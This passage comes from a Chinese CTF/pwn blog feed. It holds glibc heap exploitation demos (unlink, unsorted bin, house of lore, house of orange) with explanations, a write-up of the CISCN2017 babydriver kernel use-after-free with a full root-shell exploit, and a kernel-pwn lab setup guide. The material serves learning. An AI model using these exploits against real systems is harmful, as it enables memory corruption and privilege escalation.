&amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, &quot;Fake chunk fd: %p\n&quot;,(void*) chunk0_ptr[2]); fprintf(stderr, &quot;Fake chunk bk: %p\n\n&quot;,(void*) chunk0_ptr[3]); fprintf(stderr, &quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr, &quot;We shrink the size of chunk0 (saved as &#39;previous_size&#39; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;); fprintf(stderr, &quot;It&#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;); chunk1_hdr[0] = malloc_size; fprintf(stderr, &quot;If we had &#39;normally&#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;,(void*)chunk1_hdr[0]); fprintf(stderr, &quot;We mark our fake chunk as free by setting &#39;previous_in_use&#39; of chunk1 as False.\n\n&quot;); chunk1_hdr[1] &amp;= ~1; fprintf(stderr, &quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;); free(chunk1_ptr); fprintf(stderr, &quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;); char victim_string[8]; strcpy(victim_string,&quot;Hello!~&quot;); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, &quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;); fprintf(stderr, &quot;Original value: %s\n&quot;,victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr, &quot;New Value: %s\n&quot;,victim_string); } 在这个例子中它定义了一个全局指针来存储 chunk0的地址，chunk0 malloc的大小为0x80，分配这么大的目的是为了释放chunk0时不会被放入fastbin中。然后它分配了一个大小为0x80的chunk2，并且将chunk0的fd和bk伪造好 fd ==&gt; (uint64_t) &amp;chunk0_ptr - (sizeof(uint64_t)*3) bk==&gt; (uint64_t) &amp;chunk0_ptr - (sizeof(uint64_t)*2) 将chunk1的prev_size字段设置为 chunk0的大小，同时将prev_inuse位设置为0，最后将chunk1 释放掉，就会触发unlink。 涉及的指针操作 FD = chunk0_ptr - 0x18 BK = chunk0_ptr- 0x10 unlink实际做了 *(chunk0_ptr - 0x18 + 0x18) = chunk0_ptr - 0x10 *(chunk0_ptr - 0x10 - 0x10) = chunk0_ptr - 0x18 #主要看这步 等价于 *chunk0_ptr = chunk0_ptr - 0x18 最后，原本存储着chunk0地址的指针chunk0_ptr，会指向chunk0_ptr - 0x18，这时候通过控制chunk0就可以实现任意地址写。此时chunk0_ptr-&gt;bk 正好指向 &amp;chunk0_ptr，修改chunk0_ptr-&gt;bk 为想要修改的地址，然后再通过chunk0_ptr往地址写入内容。 最终输出 unsorted_bin_attack源码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;); fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot; &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;); unsigned long stack_var=0; fprintf(stderr, &quot;Let&#39;s first look at the target we want to rewrite on stack:\n&quot;); fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;stack_var, stack_var); unsigned long *p=malloc(400); fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;,p); fprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot; &quot;the first one during the free()\n\n&quot;); malloc(500); free(p); fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot; &quot;point to %p\n&quot;,(void*)p[1]); //------------VULNERABILITY----------- p[1]=(unsigned long)(&amp;stack_var-2); fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;); fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;,(void*)p[1]); //------------------------------------ malloc(400); fprintf(stderr, &quot;Let&#39;s malloc again to get the chunk we just free. During this time, the target should have already been &quot; &quot;rewritten:\n&quot;); fprintf(stderr, &quot;%p: %p\n&quot;, &amp;stack_var, (void*)stack_var); } 这个例子展示了unorted_bin_attack，将栈上的一个值修改为一个很大的无符号整型数。具体的原理是，从unsorted bin中取chunk出来时会往bck-fd出写入unsorted bin的地址，所以只要控制了unsorted bin中的bk，就可以实现向任意地址写如一个不可控的值 具体源码： unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); 往bk写入的地址是 想要修改的地址 - sizeof(chunk_header) 利用这漏洞可以实现的事情： 修改 global_max_fast的大小，拓展fastbin attack的范围 修改循环的次数 运行结果 unsorted_bin_into_stack源码: #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; int main() { intptr_t stack_buffer[4] = {0}; fprintf(stderr, &quot;Allocating the victim chunk\n&quot;); intptr_t* victim = malloc(0x100); fprintf(stderr, &quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;); intptr_t* p1 = malloc(0x100); fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim); free(victim); fprintf(stderr, &quot;Create a fake chunk on the stack&quot;); fprintf(stderr, &quot;Set size for next allocation and the bk pointer to any writable address&quot;); stack_buffer[1] = 0x100 + 0x10; stack_buffer[3] = (intptr_t)stack_buffer; //------------VULNERABILITY----------- fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;); fprintf(stderr, &quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;); victim[-1] = 32; victim[1] = (intptr_t)stack_buffer; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, &quot;Now next malloc will return the region of our fake chunk: %p\n&quot;, &amp;stack_buffer[2]); fprintf(stderr, &quot;malloc(0x100): %p\n&quot;, malloc(0x100)); } 这个例子展示了怎么利用unsorted bin 的分配机制，返回一个在栈上伪造的chunk。因为unsorted bin是FIFO，新插入的chunk是插到表头，然后从表尾取chunk。将victim chunk的bk修改为fake_chunk，size字段修改为别的值，最后malloc相应的大小，就可以返回伪造的fake_chunk了。 需要满足的条件： 可以控制unsorted bin 中victim chunk的size字段和bk字段 泄露出栈地址，并在栈上布置好fake_chunk victim_chunk的大小应该满足不同于将要分配的大小以及 大于2*SIZE_SZ 和 小于av-&gt;system_mem 运行结果： house_of_lore源码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; void jackpot(){ puts(&quot;Nice jump d00d&quot;); exit(0); } int main(int argc, char * argv[]){ intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[3] = {0}; fprintf(stderr, &quot;\nWelcome to the House of Lore\n&quot;); fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;); fprintf(stderr, &quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;); fprintf(stderr, &quot;Allocating the victim chunk\n&quot;); intptr_t *victim = malloc(100); fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\n&quot;, victim); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t *victim_chunk = victim-2; fprintf(stderr, &quot;stack_buffer_1 at %p\n&quot;, (void*)stack_buffer_1); fprintf(stderr, &quot;stack_buffer_2 at %p\n&quot;, (void*)stack_buffer_2); fprintf(stderr, &quot;Create a fake chunk on the stack\n&quot;); fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot; &quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;); stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot; &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot; &quot;chunk on stack&quot;); stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot; &quot;the small one during the free()\n&quot;); void *p5 = malloc(1000); fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\n&quot;, p5); fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim); free((void*)victim); fprintf(stderr, &quot;\nIn the unsorted bin the victim&#39;s fwd and bk pointers are nil\n&quot;); fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]); fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]); fprintf(stderr, &quot;Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin\n&quot;); fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;, victim); void *p2 = malloc(1200); fprintf(stderr, &quot;The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;, p2); fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;); fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]); fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]); //------------VULNERABILITY----------- fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;); victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\n&quot;); fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;); void *p3 = malloc(100); fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;); char *p4 = malloc(100); fprintf(stderr, &quot;p4 = malloc(100)\n&quot;); fprintf(stderr, &quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;, stack_buffer_2[2]); fprintf(stderr, &quot;\np4 is %p and should be on the stack!\n&quot;, p4); // this chunk will be allocated on stack intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary } house_of_lore利用了small bins的分配机制，可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。 相关代码: else { bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)){ errstr = &quot;malloc(): smallbin double linked list corrupted&quot;; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; 可以发现它只检查了bck-fd 是否等于victIm，但是没检查bck。所以可以伪造fake_chunk，使victIm-&gt;bk = fake_chunk，当victim被分配时，fake_chunk就会被链入small bins中，但是为了能成功返回fake_chunk，还要伪造一个chunk，使fake_chunk能通过__glibc_unlikely (bck-&gt;fd != victim) 检查 所以在这个例子中，它伪造了两个fake_chunk fake_chunk1 fd = victim bk = fake_chunk2 --------- fake_chunk2 fd = fake_chunk1 调试一下： victim被加入small bins 时 pwndbg&gt; p victim $2 = (intptr_t *) 0x603010 pwndbg&gt; smallbins smallbins 0x70: 0x7ffff7dd1bd8 (main_arena+184) —▸ 0x603000 ◂— 0x7ffff7dd1bd8 pwndbg&gt; parseheap addr prev size status fd bk 0x603000 0x0 0x70 Freed 0x7ffff7dd1bd8 0x7ffff7dd1bd8 0x603070 0x70 0x3f0 Used None None 0x603460 0x0 0x4c0 Used None None 将stack_chunk_1地址写入 victim-&gt;bk victim被分配后，stack_chunk_1被链入small_bins中，再分配对应大小的chunk，就可以分配到stack_chunk_1了，就可以修改栈上的内容，比如返回地址什么的，控制程序的执行流。 输出结果： house_of_orange源码：(它注释太多了，我把它都删了，不过它注释把原理都讲的挺明白了) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int winner ( char *ptr); int main() { char *p1, *p2; size_t io_list_all, *top; fprintf(stderr, &quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot; &quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;); fprintf(stderr, &quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot; &quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;); /* Firstly, lets allocate a chunk on the heap. */ p1 = malloc(0x400-16); top = (size_t *) ( (char *) p1 + 0x400 - 16); top[1] = 0xc01; p2 = malloc(0x1000); top[3] = io_list_all - 0x10; memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8); top[1] = 0x61; _IO_FILE *fp = (_IO_FILE *) top; fp-&gt;_mode = 0; // top+0xc0 fp-&gt;_IO_write_base = (char *) 2; // top+0x20 fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28 size_t *jump_table = &amp;top[12]; // controlled memory jump_table[3] = (size_t) &amp;winner; *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8 /* Finally, trigger the whole chain by calling malloc */ malloc(10); /* The libc&#39;s error message will be printed to the screen But you&#39;ll get a shell anyways. */ return 0; } int winner(char *ptr) { system(ptr); return 0; } house_of_orange是一种 堆溢出和IO_FILE利用结合的攻击手法。最主要的特点是它没有free的功能，它需要通过漏洞来达到free的效果。 前提条件： 存在堆溢出，可以控制top_chunk的size字段 存在信息泄露，能泄露出堆的地址 libc版本小于等于2.3 简单讲下house_of_orange的流程。 首先，通过堆溢出修改top_chunk的size字段，使top_chunk的size减小。然后，malloc一个比top_chunk大的的chunk，就会通过sysmalloc申请一个新的top_chunk，旧的top_chunk就会被free掉，加入unsorted bin中。然后通过unsorted bin attack往_IO_list_all 中写入main_aren + 88，此时 _IO_list_all中的 *chain指针位于 _IO_list_all + 0x68的位置，也就是 main_arena + 0x58 + 0x68–&gt;small bin中大小为0x60的位置，所以将之前的old top chunk的size修改为0x61，old top chunk就会链入small bin中，这时就可以将伪造的fake_file链入IO_all_list中,将fake_file的vtable指向伪造的IO_jump_t结构的地址，在伪造的 IO_jump_t 结构体中，在overflow函数处写入system函数，则最终会调用system函数。 几个要注意的点： top_chunk的size字段修改要页对齐，不能随便修改，同时prev_inuse位必须为1 伪造的IO_File结构体 要过几个检查 1.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是 2. _IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 查看伪造的_IO_FILE结构体 和vtable pwndbg&gt; p *((struct _IO_FILE_plus *)0x602400) $3 = { file = { _flags = 0x6e69622f, _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;\020@b&quot;, _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;, _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x40078f, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;&quot;, _lock = 0x0, _offset = 0x0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt; }, vtable = 0x602460 } pwndbg&gt; p *((struct _IO_FILE_plus *)0x602400).vtable $4 = { __dummy = 0x0, __dummy2 = 0x0, __finish = 0x0, __overflow = 0x40078f &lt;winner&gt;, __underflow = 0x0, __uflow = 0x0, __pbackfail = 0x0, __xsputn = 0x0, __xsgetn = 0x0, __seekoff = 0x0, __seekpos = 0x0, __setbuf = 0x0, __sync = 0x0, __doallocate = 0x0, __read = 0x0, __write = 0x602460, __seek = 0x0, __close = 0x0, __stat = 0x0, __showmanyc = 0x0, __imbue = 0x0 } 最终结果：]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【kernel-UAF】babydriver]]></title>
    <url>%2F2019%2F02%2F15%2F2019-2-15-kernel-UAF%2F</url>
    <content type="text"><![CDATA[题目来源：CISCN2017 babydriver 拿到手后是一个压缩包，解压后有三个文件 boot.sh #启动脚本 bzImage #内核binary rootfs.cpio #文件系统映像 boot.sh ​ 可以发现开启了smep防护，而smep保护主要功能是禁止内核执行用户态的代码 将rootfs.cpio解压，查看里面的文件 ​ 可以发现flag的owner被设为root，以及它加载了babydriver.ko这个内核模块。很明显，漏洞应该就在这个模块中 防护机制： ☁ 4.4.72 checksec babydriver.ko [*] &#39;/home/zs0zrc/pwn/kernel/babydriver/file/lib/modules/4.4.72/babydriver.ko&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x0) 将内核模块取出，用ida分析 分析下主要的函数 babyrelease int __fastcall babyrelease(inode *inode, file *filp) { _fentry__(inode, filp); kfree(babydev_struct.device_buf); //释放堆空间 printk(&quot;device release\n&quot;); return 0; } 这里涉及到了一个结构体 babydevice_t 00000000 babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429) 00000000 ; XREF: .bss:babydev_struct/r 00000000 device_buf dq ? ; XREF: babyrelease+6/r 00000000 ; babyopen+26/w ... ; offset 00000008 device_buf_len dq ? ; XREF: babyopen+2D/w 00000008 ; babyioctl+3C/w ... 00000010 babydevice_t ends babyopen 申请一块大小为0x40的空间，地址赋给babydev_struct.device_buf，同时将babydev_struct.device_buf_len设为0x40 int __fastcall babyopen(inode *inode, file *filp) { _fentry__(inode, filp); babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL); babydev_struct.device_buf_len = 64LL; printk(&quot;device open\n&quot;); return 0; } babyioctl 这个函数实现了一个设备控制命令0x10001，功能是将全局变量 babydev_struct中的babydev_struct.device_buf释放掉，然后再根据用户传入的size重新申请一块空间，并且将babydev_struct.device_buf_len设置为对应的值 // local variable allocation has failed, the output may be wrong! __int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg) { size_t v3; // rdx size_t v4; // rbx __int64 result; // rax _fentry__(filp, *(_QWORD *)&amp;command); v4 = v3; if ( command == 0x10001 ) { kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL); babydev_struct.device_buf_len = v4; printk(&quot;alloc done\n&quot;); result = 0LL; } else { printk(&amp;unk_2EB); result = -22LL; } return result; } babywirte 这里我用ida反编译的代码看的有点奇怪，所以我看了下汇编的代码，这里copy_from_user()中的参数应该是 copy_from_user(babydev_struct.device_buf,buffer,length)，就是从用户空间buffer中拷贝数据到babydev_struct.device_buf ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset) { size_t v4; // rdx ssize_t result; // rax ssize_t v6; // rbx _fentry__(filp, buffer); if ( !babydev_struct.device_buf ) return -1LL; result = -2LL; if ( babydev_struct.device_buf_len &lt;= v4 ) return result; v6 = v4; copy_from_user(); result = v6; return result; } babyread 这个和babywrite差不多，将babydev_struct.device_buf 的内容拷贝到buffer中 ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset) { size_t v4; // rdx ssize_t result; // rax ssize_t v6; // rbx _fentry__(filp, buffer, length, offset); if ( !babydev_struct.device_buf ) return -1LL; result = -2LL; if ( babydev_struct.device_buf_len &lt;= v4 ) return result; v6 = v4; copy_to_user(buffer); result = v6; return result; } 漏洞点 这里存在一个伪条件竞争的UAF漏洞，如果同时打开两个设备，那么后面分配的设备会覆盖掉之前的设备，因为babydev_struct是全局变量。同理，如果释放掉第一个设备，那么第二个设备也是被释放过的。 利用思路 这里采用改写进程的cred结构体来达到提权的目的。 打开两次设备，通过ioctl改写设备大小为cred结构体的大小，然后释放掉设备 fork一个新进程，这个新进程的cred结构体所在的空间会和之前释放掉的设备的空间重合 通过另一个文件描述符写，将cred中的uid和gid改为0 对应版本的cred结构体，大小为0xa8 struct cred { atomic_t usage; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we&#39;re permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */ #ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */ #endif #ifdef CONFIG_SECURITY void *security; /* subjective LSM security */ #endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */ }; exp： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;stropts.h&gt; #include &lt;sys/wait.h&gt; #include &lt;sys/stat.h&gt; int main() { int fd1 = open(&quot;/dev/babydev&quot;,2); int fd2 = open(&quot;/dev/babydev&quot;,2); ioctl(fd1,0x10001,0xa8); close(fd1); int pid = fork(); if(pid &lt; 0) { puts(&quot;[*] fork error!&quot;); exit(0); } else if (pid == 0) { int buf[20]={0}; write(fd2,buf,28); system(&quot;/bin/sh&quot;); puts(&quot;you are root now&quot;); } else { wait(NULL); } return 0; } 静态编译exp，然后将得到的二进制文件放入解压的文件夹下，重新打包系统 find . | cpio -o --format=newc &gt; rootfs.cpio 启动系统，运行exp,获取root权限]]></content>
      <categories>
        <category>Linux_Kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kernel_pwn入门之环境搭建]]></title>
    <url>%2F2019%2F01%2F31%2F2019-1-31-kernel_pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[跟着大佬的博客，开始学习搭建内核环境。开篇文章记录一下。 获取内核获取内核的方法有两种，一种是自己下载源码，然后编译，另一种是通过apt直接下载内核 编译内核 下载源码 通过官网下载 在 https://www.kernel.org/ 上下载，最初我下的是2.6.0版本，发下编译会遇到很多问题……然后就放弃了，下了一个4.1.1版本 https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.1.1.tar.gz ubuntu上可以通过wget来下载 wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.1.1.tar.gz 通过apt来下载 根据内核版本搜索，例如 sudo apt search linux-headers-4. 但是我没有发现我下的4.1.1版本的….能下的最低版本都是4.10.0-1004，但是问题不大，随便挑了个4.10.1来下 下载源码 sudo apt install linux-headers-4.10.0-1004 最后下载的源码会在/usr/src目录下 安装需要的依赖 sudo apt-get update sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 解压源码，进入源码目录 输入 make menuconfig 然后就会见到这个界面，按照大佬的做法 进入kernel hacking 勾选以下项目 Kernel debugging Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers KGDB 然后保存退出 生成bzImage make bzImage 经过漫长的等待，出现下图的信息，说明编译成功。然后bzImage在 /arch/x86/boot中，vmlinux在当前路径下 解释下几个名词 vmlinux是未压缩的内核 vmlinuz是vmlinux的压缩文件。 vmlinux 是ELF文件，即编译出来的最原始的文件。 vmlinuz应该是由ELF文件vmlinux经过OBJCOPY后，并经过压缩后的文件 zImage是vmlinuz经过gzip压缩后的文件，适用于小内核 bzImage是vmlinuz经过gzip压缩后的文件，适用于大内核 下载内核 根据版本号搜索 sudo apt search linux-image- 挑个喜欢的下载 sudo apt download linux-image-4.10.0-1004-gcp 这个下载下来的是一个deb文件，解压后镜像在data.tar.xz中 编译busybox用来生成简易的文件镜像 busybox简介 BusyBox是一个遵循GPL协议、以自由软件形式发行的应用程序。Busybox在单一的可执行文件中提供了精简的Unix工具集，可运行于多款POSIX环境的操作系统，例如Linux（包括Android[6]）、Hurd[7]、FreeBSD[8][9]等等。由于BusyBox可执行文件的文件大小比较小、并通常使用Linux内核，这使得它非常适合使用于嵌入式系统。作者将BusyBox称为“嵌入式Linux的瑞士军刀”。[10] —摘自维基百科 busybox是Linux上的一个应用程序 它整合了许多Linux上常用的工具和命令 IBM的一篇关于busybox的文章 文章地址，写的很详细。 编译busybox 从官网上下载源代码https://busybox.net/ 我下的是busybox-1.30.0 解压，进入根目录 执行命令 make menuconfig，然后会出现一个界面 这里在Settings中勾选Build static binary (no shared libs)，然后save就可以了 编译，执行make install 编译完后会多出一个_install文件夹，这是编译后的结果 进入_install，然后输入如下命令 mkdir proc mkdir sys touch init chmod +x init 在init写入下面的内容，用于内核初始化 #!/bin/sh echo &quot;{==DBG==} INIT SCRIPT&quot; mkdir /tmp mount -t proc none /proc mount -t sysfs none /sys mount -t debugfs none /sys/kernel/debug mount -t tmpfs none /tmp # insmod /xxx.ko # 加载模块 mdev -s # We need this to find /dev/sda later echo -e &quot;{==DBG==} Boot took $(cut -d&#39; &#39; -f1 /proc/uptime) seconds&quot; setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user # exec /bin/sh #root 打包成镜像 #在busybox的_install目录下输入下面的命令 find . | cpio -o --format=newc &gt; ./rootfs.img 启动系统这里用qemu来运行 qemu简介QEMU（quick emulator）是一款由Fabrice Bellard等人编写的免费的可执行硬件虚拟化的（hardware virtualization）开源托管虚拟机（VMM）。其与Bochs，PearPC类似，但拥有高速（配合KVM），跨平台的特性。QEMU是一个托管的虚拟机镜像，它通过动态的二进制转换，模拟CPU，并且提供一组设备模型，使它能够运行多种未修改的客户机OS，可以通过与KVM（kernel-based virtual machine开源加速器）一起使用进而接近本地速度运行虚拟机（接近真实计算机的速度）。QEMU还可以为user-level的进程执行CPU仿真，进而允许了为一种架构编译的程序在另外一中架构上面运行（借由VMM的形式）。 ---摘自维基百科 qemu的官方文档链接地址 启动脚本 将生成的rootfs.img和编译的内核bzImage文件放在同一文件夹下，新建一个启动脚本boot.sh，这是我是直接拿大佬的脚本来用的，加了一点注释，参数的具体意义可以参照qemu的官方文档。 #! /bin/sh qemu-system-x86_64 \ -m 128M \ #指定虚拟机的RAM大小 -kernel ./bzImage \ #指定内核 -initrd ./rootfs.img \ #用于提供 INITRD镜像 -append &quot;root=/dev/ram rw oops=panic panic=1 kalsr&quot; \ # -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \ #配置用户模式的网络 -monitor /dev/null \ #将监视器重定向到主机设备/dev/null -smp cores=2,threads=1 \ #用于声明所有可能用到的cpus, i.e. sockets * cores * threads = maxcpus. -cpu kvm64,+smep \ #设置CPU的安全选项 #-S 启动gdb调试 #-gdb tcp:1234 等待gdb调试 运行这个脚本，启动qemu,等一下就可以了 编译ko内核环境搭好了，来学习下怎么编译模块文件 源码#include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/init.h&gt; static int __init init_fun(void) { printk(&quot;&lt;1&gt;Hello,World! from the kernel space…\n&quot;); return 0; } static void __exit exit_fun(void) { printk(&quot;&lt;1&gt;Goodbye, World! leaving kernel space…\n&quot;); } module_init(init_fun); module_exit(exit_fun); MODULE_LICENSE(&quot;GPL&quot;); Makefileobj-m := hello.o KERNELDR := /home/zs0zrc/linux-4.1.1 PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 然后编译，将编译后的得到的ko文件放入 _install目录下，并修改init文件。重新打包一下镜像 最后用qemu运行，可以发现多出了模块的输出 reference http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/ https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/ http://p4nda.top/2018/04/04/kernel-pwn-start/ https://www.ibm.com/developerworks/cn/linux/l-busybox/index.html 